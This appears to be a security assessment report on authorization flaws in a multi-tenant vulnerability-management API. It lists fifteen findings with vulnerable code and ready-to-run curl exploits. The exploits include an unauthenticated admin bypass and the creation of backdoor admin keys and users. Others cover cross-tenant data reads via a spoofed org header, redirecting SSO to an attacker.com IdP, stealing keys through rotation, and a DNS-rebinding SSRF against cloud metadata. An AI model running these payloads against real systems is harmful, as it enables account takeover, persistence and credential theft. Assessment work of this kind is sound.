```

#### Exploitation

When `FIXOPS_AUTH_MODE` is not set to `"enforced"` (the default), any request — including requests with **no credentials whatsoever** — is granted a full admin `AuthContext` with `role="admin"` and all admin scopes. The check at line 193 inverts the intended logic: a missing or incorrect environment variable grants access rather than denying it.

**Attack payload (default deployment):**
```bash
curl http://host.docker.internal:8000/api/v1/admin/users
# Returns 200 with full admin data — no credentials required
```

#### Impact

Complete authentication bypass. Every endpoint protected by `require_auth()` or `require_scope()` from this module grants admin access to any unauthenticated attacker. Combined with the hardcoded JWT secret default (`fixops-dev-secret-change-in-production`), an attacker can also forge valid JWTs for any user without needing the bypass.

---

### AUTHZ-VULN-02 — Empty Auth Strategy Fallback (app.py)

**Type:** Vertical Privilege Escalation
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (overlay sets strategy="token"; bypassed if overlay config is absent or modified)

#### Vulnerable Code

**`suite-api/apps/api/app.py` lines 2073–2079:**
```python
auth_strategy = overlay.auth.get("strategy", "").lower()
# Enterprise enforcement: if FIXOPS_API_TOKEN is set in env but overlay
# doesn't declare a strategy, auto-promote to token-based auth.
_env_api_token = os.getenv("FIXOPS_API_TOKEN", "").strip()
if not auth_strategy and _env_api_token:
    auth_strategy = "token"
    logger.info("Auto-promoted auth strategy to 'token' (FIXOPS_API_TOKEN set)")
```

**`suite-api/apps/api/app.py` lines 2197–2199:**
```python
        # Fallback — no auth strategy → admin (dev mode)
        request.state.user_role = "admin"
        request.state.user_scopes = _ALL_SCOPES
```

where `_ALL_SCOPES` is:
```python
_ALL_SCOPES = [
    "read:sbom", "write:sbom", "read:findings", "write:findings",
    "read:graph", "write:graph", "read:feeds", "read:evidence",
    "write:evidence", "read:integrations", "write:integrations",
    "attack:execute", "admin:all",   # ← full admin
]
```

#### Exploitation

The fallback at lines 2197–2199 executes when `auth_strategy` is an empty string AND `_env_api_token` is also empty (preventing auto-promotion to token mode). This triggers when:
1. The overlay config file is absent or lacks an `auth.strategy` key, AND
2. `FIXOPS_API_TOKEN` is not set in the environment

In the default docker-compose configuration (`FIXOPS_API_TOKEN=${FIXOPS_API_TOKEN:-aldeci-demo-token}`), if the environment variable substitution produces an empty string, both conditions are met.

**Attack payload:**
```bash
# No headers, no credentials
curl http://host.docker.internal:8000/api/v1/findings
# Returns 200 with admin-scoped access to all findings
```

#### Impact

13-scope admin access granted unconditionally. Independent bypass from VULN-01 — either one alone is sufficient for complete privilege escalation.

---

### AUTHZ-VULN-03 — Unrestricted Role Assignment on API Key Creation

**Type:** Vertical Privilege Escalation
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (requires authentication; exploitable under VULN-01/02)

#### Vulnerable Code

**`suite-api/apps/api/auth_router.py` lines 131–205:**
```python
class KeyCreateRequest(BaseModel):
    user_id: str         # ← caller-controlled: any user_id accepted
    name: str
    role: str = "viewer" # ← caller-controlled: any role string accepted
    scopes: list = []    # ← caller-controlled: any scope list accepted
    ttl_days: Optional[int] = None

@router.post("/keys", response_model=KeyCreateResponse, status_code=201,
             dependencies=[Depends(api_key_auth)])
async def create_api_key(req: KeyCreateRequest, request: Request):
    _require_admin(request)  # checks request.state.user_role == "admin"
    km = _get_key_manager()
    record, plaintext = km.create_key(
        user_id=req.user_id,   # ← no ownership check against caller identity
        name=req.name,
        role=req.role,         # ← no validation that role <= caller role
        scopes=req.scopes,     # ← no scope ceiling enforced
        ttl_days=req.ttl_days,
    )
    resp["plaintext_key"] = plaintext   # ← plaintext key returned to caller
    return KeyCreateResponse(**resp)
```

#### Exploitation

Under the VULN-01/02 auth bypass, `request.state.user_role = "admin"` satisfies `_require_admin()`. The caller then creates an admin-scoped API key for any arbitrary `user_id`:

```bash
curl -X POST http://host.docker.internal:8000/api/v1/auth/keys \
  -H "Content-Type: application/json" \
  -d '{
    "user_id": "attacker-backdoor",
    "name": "persistence-key",
    "role": "admin",
    "scopes": ["admin:all", "read:findings", "write:findings"],
    "ttl_days": 3650
  }'

# Response:
{
  "plaintext_key": "fixops_AbCdEf1234...",  ← valid admin API key
  "user_id": "attacker-backdoor",
  "role": "admin",
  "scopes": ["admin:all", ...]
}
```

#### Impact

Persistent backdoor credential that survives server restarts, overlay config changes, and auth mode enforcement. Even if VULN-01/02 are patched, the created API key remains valid.

---

### AUTHZ-VULN-04 — Privileged Role Assignment on User Creation

**Type:** Vertical Privilege Escalation
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (requires authentication; exploitable under VULN-01/02)

#### Vulnerable Code

**`suite-api/apps/api/users_router.py` lines 318–352:**
```python
@router.post("", response_model=UserResponse, status_code=201)
async def create_user(user_data: UserCreate, request: Request):
    caller_role: str = getattr(request.state, "user_role", "viewer")
    caller_scopes: list = getattr(request.state, "user_scopes", [])
    is_admin_caller = caller_role in ("admin", "super_admin") or "admin:all" in caller_scopes

    requested_role_value = user_data.role.value
    if requested_role_value in _PRIVILEGED_ROLES and not is_admin_caller:
        raise HTTPException(status_code=403, ...)
    # ... no check that caller's role >= requested role for non-privileged roles

    user = User(
        ...
        role=user_data.role,   # ← role directly from request body
        ...
    )
    created_user = db.create_user(user)
    return UserResponse(**created_user.to_dict())
```

Under VULN-01: `request.state.user_role = "admin"` → `is_admin_caller = True` → any role assignable.
Under VULN-02: `"admin:all" in request.state.user_scopes` → `is_admin_caller = True` → same result.

#### Exploitation

```bash
curl -X POST http://host.docker.internal:8000/api/v1/users \
  -H "Content-Type: application/json" \
  -d '{
    "email": "backdoor@attacker.com",
    "password": "Backdoor123!",
    "first_name": "Admin",
    "last_name": "Backdoor",
    "role": "admin"
  }'

# Response: HTTP 201
{
  "id": "usr_abc123",
  "email": "backdoor@attacker.com",
  "role": "admin",   ← admin role confirmed
  "status": "active"
}
```

#### Impact

Permanent admin account in the SQLite user database. Persists across server restarts. Usable to log in via `/api/v1/users/login` to obtain JWT tokens with admin scopes. Even after VULN-01/02 are patched, this backdoor account survives.

---

## Vulnerability Evidence: Horizontal Tenant Isolation Failures

---

### AUTHZ-VULN-05 — Cross-Tenant Findings Enumeration (Attacker-Controlled org_id)

**Type:** Horizontal Privilege Escalation / IDOR
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (requires authentication; org_id is attacker-controlled via header)

#### Vulnerable Code

**`suite-api/apps/api/findings_routes.py` lines 221–254:**
```python
async def list_findings(
    ...
    org_id: str = Depends(get_org_id),
    ...
):
    # Filter by org_id
    findings = [f for f in _findings_store.values() if f.get("org_id") == org_id]
```

**`suite-api/apps/api/org_middleware.py` lines 155–180 (`_extract_org_id`):**
```python
def _extract_org_id(request: Request) -> str:
    # 1. JWT claim (set by _verify_api_key in app.py) — NOT SET for token auth
    state_org = getattr(request.state, "org_id", None)
    if state_org and str(state_org).strip():
        return str(state_org).strip()

    # 2. X-Org-ID header  ← ATTACKER-CONTROLLED
    header_org = request.headers.get("X-Org-ID", "").strip()
    if header_org:
        return header_org

    # 3. org_id query parameter  ← ATTACKER-CONTROLLED
    param_org = request.query_params.get("org_id", "").strip()
    if param_org:
        return param_org

    return "default"
```

#### Exploitation

When the caller authenticates with an API key (`X-API-Key`), `_verify_api_key()` does **not** set `request.state.org_id`. The middleware then falls through to the attacker-supplied `X-Org-ID` header or `org_id` query parameter:

```bash
# Access another tenant's findings by supplying their org_id
curl http://host.docker.internal:8000/api/v1/findings \
  -H "X-API-Key: <valid-token>" \
  -H "X-Org-ID: victim-org-id"

# Returns findings belonging to victim-org-id
```

Under VULN-01/02, the API key is not required:
```bash
curl http://host.docker.internal:8000/api/v1/findings \
  -H "X-Org-ID: victim-org-id"
# Returns findings for victim-org-id — no credentials needed
```

#### Impact

Complete cross-tenant findings enumeration. An attacker with knowledge of any other tenant's `org_id` reads their full vulnerability database including CVEs, affected assets, CVSS scores, and remediation status.

---

### AUTHZ-VULN-06 — Direct Finding Access by ID Without Tenant Verification

**Type:** Horizontal Privilege Escalation / IDOR
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (requires authentication; org_id bypassed via header)

#### Vulnerable Code

**`suite-api/apps/api/findings_routes.py` lines 313–332:**
```python
async def get_finding(finding_id: str, org_id: str = Depends(get_org_id)):
    finding = _findings_store.get(finding_id)
    if not finding:
        raise HTTPException(status_code=404, detail="Finding not found")

    # AUTHZ-VULN-06: Enforce org_id isolation
    if finding.get("org_id") != org_id:
        raise HTTPException(status_code=404, detail="Finding not found")

    return FindingDetailResponse(**finding)
```

The isolation check exists but is bypassable because `org_id` is attacker-controlled (same mechanism as VULN-05).

#### Exploitation

```bash
# Step 1: Enumerate finding IDs via VULN-05
curl http://host.docker.internal:8000/api/v1/findings \
  -H "X-Org-ID: victim-org" -H "X-API-Key: <token>"
# → finding_id: "find_abc123", org_id: "victim-org"

# Step 2: Supply matching org_id to bypass isolation check
curl http://host.docker.internal:8000/api/v1/findings/find_abc123 \
  -H "X-Org-ID: victim-org" -H "X-API-Key: <token>"
# → Returns full finding detail
```

---

### AUTHZ-VULN-07 — Cross-Tenant SSO Configuration Access and Manipulation

**Type:** Horizontal Privilege Escalation
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (requires admin auth; org_id not used in SSO CRUD)

#### Vulnerable Code

**`suite-api/apps/api/auth_router.py` lines 63–123:**
```python
@router.get("/sso", response_model=PaginatedSSOConfigResponse)
async def list_sso_configs():
    """List SSO configurations."""
    # No org_id parameter, no get_org_id dependency
    configs = db.list_sso_configs()   # ← Returns ALL orgs' SSO configs
    return {...}

@router.get("/sso/{id}", response_model=SSOConfigResponse)
async def get_sso_config(id: str):
    # No org_id check — retrieves any SSO config by ID only
    config = db.get_sso_config(id)
    ...

@router.put("/sso/{id}", response_model=SSOConfigResponse)
async def update_sso_config(id: str, config_data: SSOConfigUpdate):
    # No ownership check — updates any org's SSO config by ID
    config = db.update_sso_config(id, ...)
```

#### Exploitation

```bash
# List ALL SSO configurations (all tenants)
curl http://host.docker.internal:8000/api/v1/auth/sso \
  -H "X-API-Key: <admin-token>"

# Response includes every tenant's IdP configuration:
{
  "items": [
    {"id": "sso_1", "org_id": "acme-corp", "metadata_url": "https://acme.okta.com/..."},
    {"id": "sso_2", "org_id": "victim-corp", "metadata_url": "https://victim.azure.com/..."},
    ...
  ]
}

# Redirect victim-corp's SAML logins to attacker-controlled IdP:
curl -X PUT http://host.docker.internal:8000/api/v1/auth/sso/sso_2 \
  -H "X-API-Key: <admin-token>" \
  -H "Content-Type: application/json" \
  -d '{"metadata_url": "https://attacker.com/saml/metadata"}'
```

#### Impact

Highest-impact horizontal vulnerability. An attacker can redirect another organization's entire authentication flow to a malicious IdP, harvesting credentials for all users of that organization.

---

### AUTHZ-VULN-08 — API Key Management Without Ownership Verification

**Type:** Horizontal Privilege Escalation
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (requires admin auth; no ownership check in key operations)

#### Vulnerable Code

**`suite-api/apps/api/auth_router.py` lines 208–285:**
```python
@router.post("/keys/{key_id}/rotate", ...)
async def rotate_api_key(key_id: str, req: KeyRotateRequest, request: Request):
    _require_admin(request)   # checks caller is admin — not that they OWN the key
    km = _get_key_manager()
    new_record, new_plaintext = km.rotate_key(key_id, ...)
    resp["plaintext_key"] = new_plaintext   # ← returns new key value!
    return KeyCreateResponse(**resp)

@router.delete("/keys/{key_id}", ...)
async def revoke_api_key(key_id: str, request: Request):
    _require_admin(request)
    km.revoke_key(key_id)   # ← no ownership check

@router.get("/keys", ...)
async def list_api_keys(request: Request, user_id: Optional[str] = None, ...):
    _require_admin(request)
    keys = km.list_keys(user_id=user_id, ...)
    # user_id filter is OPTIONAL — omit to enumerate all keys system-wide
```

#### Exploitation

```bash
# List ALL API keys system-wide (no user_id filter)
curl http://host.docker.internal:8000/api/v1/auth/keys \
  -H "X-API-Key: <admin-token>"

# Rotate another tenant's API key (steal the new value)
curl -X POST http://host.docker.internal:8000/api/v1/auth/keys/key_victim_123/rotate \
  -H "X-API-Key: <admin-token>" \
  -d '{"performed_by": "attacker"}'
# Response contains plaintext_key → now attacker has victim's credential

# Revoke another tenant's access
curl -X DELETE http://host.docker.internal:8000/api/v1/auth/keys/key_victim_123 \
  -H "X-API-Key: <admin-token>"
```

#### Impact

Key rotation is particularly dangerous: the rotation response returns the new plaintext key, giving the attacker a valid credential for the victim's account. Revocation can deny service to any tenant's API integrations.

---

### AUTHZ-VULN-09 — Cross-Tenant Audit Log Access

**Type:** Horizontal Privilege Escalation
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (requires auth; audit schema lacks org_id column)

#### Vulnerable Code

**`suite-api/apps/api/audit_router.py` lines 105–128:**
```python
@router.get("/logs", response_model=PaginatedAuditLogResponse)
async def list_audit_logs(
    org_id: str = Depends(get_org_id),   # org_id is extracted...
    limit: int = Query(100),
    offset: int = Query(0),
    ...
):
    # AUTHZ-VULN-09: org_id is applied to filter results to the caller's tenant only.
    logs = db.list_audit_logs(limit=limit, offset=offset)
    #                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
    #                         org_id NOT PASSED to DB query!
    return PaginatedAuditLogResponse(items=logs, ...)

@router.get("/logs/export")
async def export_audit_logs():
    # No org_id parameter whatsoever
    logs = db.export_all_logs()   # returns all tenants' logs
```

The comment in the code says `org_id is applied to filter` — but the actual DB call omits `org_id`. The export endpoint has no org_id parameter at all.

#### Exploitation

```bash
# Read all audit logs (all tenants, all users)
curl http://host.docker.internal:8000/api/v1/audit/logs \
  -H "X-API-Key: <token>"

# Export complete system audit trail
curl http://host.docker.internal:8000/api/v1/audit/logs/export \
  -H "X-API-Key: <token>"
```

#### Impact

Full audit trail disclosure including user activity, IP addresses, user-agent strings, resource access patterns, and action history for all tenants. Provides intelligence for further targeted attacks and exposes user behavior patterns.

---

### AUTHZ-VULN-10 — Cross-Tenant Analytics Data Access

**Type:** Horizontal Privilege Escalation
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (requires auth; analytics DB has no org_id column)

#### Vulnerable Code

**`suite-api/apps/api/analytics_routes.py` lines 163–450:**
```python
@router.get("/findings")
async def get_analytics_findings(
    org_id: str = Depends(get_org_id),
    limit: int = 5000,
    ...
):
    findings = db.list_findings(limit=5000)
    #                           ^^^^^^^^^^
    #                           limit only — org_id extracted but not passed
    return findings

@router.get("/findings/{id}")
async def get_analytic_finding(id: str):
    # No org_id parameter at all
    finding = db.get_finding(id)
    return finding
```

The analytics subsystem was built without multi-tenancy support. Queries return the complete dataset regardless of the authenticated org_id.

#### Exploitation

```bash
# Read all analytics findings from all tenants
curl http://host.docker.internal:8000/api/v1/analytics/findings \
  -H "X-API-Key: <token>"

# Read executive dashboard for all orgs
curl http://host.docker.internal:8000/api/v1/analytics/dashboard/overview \
  -H "X-API-Key: <token>"
```

---

### AUTHZ-VULN-11 — Workflow IDOR (Read/Modify/Delete by ID Without Ownership Check)

**Type:** Horizontal Privilege Escalation / IDOR
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (requires auth; no org_id on individual workflow endpoints)

#### Vulnerable Code

**`suite-api/apps/api/workflow_router.py` lines 138–177:**
```python
@router.get("/{workflow_id}", dependencies=[Depends(api_key_auth)])
def get_workflow(workflow_id: str):
    # No org_id parameter — retrieves any workflow by ID
    wf = _get_engine().get_workflow(workflow_id)
    if not wf:
        raise HTTPException(status_code=404)
    return wf

@router.patch("/{workflow_id}", dependencies=[Depends(api_key_auth)])
def update_workflow(workflow_id: str, body: WorkflowUpdate):
    # No ownership check
    wf = _get_engine().update_workflow(workflow_id, updates)
    return wf

@router.delete("/{workflow_id}", dependencies=[Depends(api_key_auth)])
def delete_workflow(workflow_id: str):
    # No org_id — deletes any workflow by ID
    deleted = _get_engine().delete_workflow(workflow_id)

@router.post("/{workflow_id}/trigger", ...)
def trigger_workflow(workflow_id: str, ...):
    # Executes any workflow without ownership check
    ...
```

Compare: the list endpoint correctly filters by `org_id`:
```python
@router.get("/", ...)
def list_workflows(org_id: str = Query(default="default"), ...):
    workflows = _get_engine().list_workflows(org_id=org_id, ...)
    # Correct: org_id filtering on list
```

But individual GET/PATCH/DELETE/TRIGGER operations bypass all tenant checks.

#### Exploitation

```bash
# Trigger another tenant's automated workflow
curl -X POST http://host.docker.internal:8000/api/v1/workflows/wf_victim_456/trigger \
  -H "X-API-Key: <token>" \
  -d '{"event": {"type": "scan_complete"}}'

# Delete another tenant's workflow
curl -X DELETE http://host.docker.internal:8000/api/v1/workflows/wf_victim_456 \
  -H "X-API-Key: <token>"
```

#### Impact

Cross-tenant workflow manipulation enables disruption of automated security processes (scheduled scans, alerting, remediation) and exfiltration of workflow configuration (trigger conditions, automated actions, connected integrations).

---

### AUTHZ-VULN-12 — Compliance Evidence Bundle Access Without Tenant Isolation

**Type:** Horizontal Privilege Escalation
**Confidence:** HIGH
**Live Status:** CODE-CONFIRMED (requires auth; filesystem enumeration without org_id filtering)

#### Vulnerable Code

**`suite-evidence-risk/api/evidence_router.py` lines 530–576 and 823–918:**
```python
@router.get("/bundles")
async def list_compliance_bundles(auth: AuthContext = Depends(require_auth)):
    # Iterates filesystem bundle directory — no org_id filtering
    bundle_dir = get_bundle_directory()
    bundles = [f for f in bundle_dir.iterdir() if f.is_dir()]
    # Returns ALL tenants' bundles
    return [{"id": b.name, "path": str(b)} for b in bundles]

@router.get("/bundles/{bundle_id}/download")
async def download_evidence_bundle(bundle_id: str,
                                    auth: AuthContext = Depends(require_auth)):
    # No tenant check — any bundle served by ID
    bundle_path = get_bundle_directory() / bundle_id
    return FileResponse(str(bundle_path / "bundle.json"))
```

Neither endpoint has `Depends(get_org_id)` in its signature. Authentication is enforced (via `require_auth`) but authorization is absent.

#### Exploitation

```bash
# List all compliance bundles across all tenants
curl http://host.docker.internal:8000/evidence/bundles \
  -H "X-API-Key: <token>"

# Download another tenant's compliance evidence
curl http://host.docker.internal:8000/evidence/bundles/bundle_victim_789/download?format=json \
  -H "X-API-Key: <token>"
```

#### Impact

Compliance evidence bundles contain audit findings, security assessments, remediation proof, and attestations used for regulatory compliance reporting (SOC 2, ISO 27001, PCI DSS). Exposure violates data sovereignty requirements.

---

## Vulnerability Evidence: Context and Workflow Abuse

---

### AUTHZ-VULN-13 — SAML Assertion Replay Attack

**Type:** Context/Workflow Abuse
**Confidence:** MEDIUM
**Live Status:** PARTIAL-CONFIRMED (SSO disabled on live server; code vulnerability confirmed)

#### Live Test Result

```
GET http://host.docker.internal:8000/api/v1/auth/sso/saml/login
HTTP/1.1 503 Service Unavailable
{"detail": "SSO is not enabled"}
```

SAML is not configured on the test server. The vulnerability exists in the code and would be exploitable in any deployment with SAML SSO enabled.

#### Vulnerable Code

**`suite-core/core/sso_provider.py` lines 587–638:**
```python
def process_response(self, saml_response_b64: str, relay_state: str):
    """
    Process a SAML response from the IdP.
    # NOTE: Incomplete signature verification — see known_issues.md
    """
    # Validate status code: Success/Failure
    if status_code != "urn:oasis:names:tc:SAML:2.0:status:Success":
        raise SAMLError("SAML authentication failed")

    # ← Missing: InResponseTo validation against stored AuthnRequest ID
    # ← Missing: Assertion ID replay prevention (no used-assertion-ID store)
    # ← Missing: Complete signature chain validation (comment confirms)

    return AuthContext(
        user_id=name_id,
        email=email,
        ...
    )
```

#### Exploitation Scenario

1. Attacker observes or obtains a valid `SAMLResponse` (from network traffic, error logs, or developer tools)
2. POST the captured SAMLResponse to `/api/v1/auth/saml/acs` (SAML ACS endpoint)
3. Without `InResponseTo` validation or assertion ID tracking, the server re-processes the assertion
4. Attacker obtains a session as the original user

---

### AUTHZ-VULN-14 — Scanner Ingest Pipeline Poisoning

**Type:** Context/Workflow Abuse
**Confidence:** MEDIUM
**Live Status:** CODE-CONFIRMED (requires authentication; `pipeline` flag unguarded)

#### Vulnerable Code

**`suite-api/apps/api/scanner_ingest_router.py` lines 224–242:**
```python
@router.post("/upload")
async def ingest_scanner_results(
    file: UploadFile,
    scanner_type: str = Form(...),
    pipeline: bool = Form(False),   # ← Accepts pipeline flag from request body
    org_id: str = Depends(get_org_id),
    ...
):
    findings_dicts = parse_scanner_output(content, scanner_type)

    if pipeline:
        # No elevated scope requirement for pipeline flag!
        from core.brain_pipeline import BrainPipeline
        result = BrainPipeline().run(findings_dicts)  # ← Directly into ML pipeline
```

Any authenticated user can set `pipeline=true` to inject crafted data directly into the ML risk-scoring pipeline. No `admin:all` scope or elevated role is required for this parameter.

#### Exploitation

```bash
# Inject crafted findings into the ML risk pipeline
curl -X POST http://host.docker.internal:8000/api/v1/scanner-ingest/upload \
  -H "X-API-Key: <token>" \
  -F "file=@crafted_findings.json" \
  -F "scanner_type=trivy" \
  -F "pipeline=true" \
  -F "org_id=victim-org"

# Response confirms pipeline execution:
{
  "status": "processed",
  "pipeline_result": {...},
  "findings_count": 200
}
```

#### Impact

Up to 200 crafted findings per request injected directly into the ML risk-scoring pipeline. Repeated calls with crafted high-severity findings shift all risk scores and priority rankings platform-wide, causing legitimate critical vulnerabilities to be deprioritized while fake vulnerabilities consume remediation resources.

---

### AUTHZ-VULN-15 — Webhook Delivery SSRF via DNS Rebinding

**Type:** Context/Workflow Abuse
**Confidence:** MEDIUM
**Live Status:** CODE-CONFIRMED (requires authentication; TOCTOU gap exists)

#### Vulnerable Code

**`suite-api/apps/api/webhook_subscriptions_router.py` lines 129 and 204:**
```python
# Registration: IP check performed ONCE at registration time
@router.post("/webhooks")
async def register_webhook(sub: WebhookSubscriptionCreate, ...):
    if _is_private_ip(sub.url):   # ← IP check here (time T1)
        raise HTTPException(400, "Private IPs not allowed")
    # Registration saved to DB

# Delivery: No re-validation of IP
async def _deliver_webhook(sub: dict, payload: dict):
    # At time T2 (after DNS TTL expiry), DNS may resolve to different IP
    resp = requests.post(
        sub['url'],              # ← URL from DB, no IP re-check
        json=payload,
        allow_redirects=False,   # ← Prevents redirect SSRF but not DNS rebinding
        timeout=10,
    )
```

#### Exploitation Scenario (DNS Rebinding)

```
Timeline:
T1: Register webhook URL: https://attacker.controlled.com/hook
    → DNS resolves to 203.0.113.1 (public IP) → passes _is_private_ip() check
    → Webhook URL saved to database

T2 (after DNS TTL ~60s): Update attacker.controlled.com DNS A record
    → Now resolves to 169.254.169.254 (cloud metadata)

T3: Trigger a platform event (e.g., new finding created)
    → _deliver_webhook() calls requests.post("https://attacker.controlled.com/hook")
    → DNS resolves to 169.254.169.254 (cloud metadata endpoint)
    → AWS/GCP/Azure instance metadata is fetched and posted to webhook response
    → Attacker receives: {"AccessKeyId": "ASIA...", "SecretAccessKey": "..."}
```

#### Impact

SSRF to cloud metadata endpoints (169.254.169.254) enabling theft of instance credentials (IAM roles, access keys). Also enables scanning of internal network services not exposed externally.

---


*Assessment completed 2026-04-16*
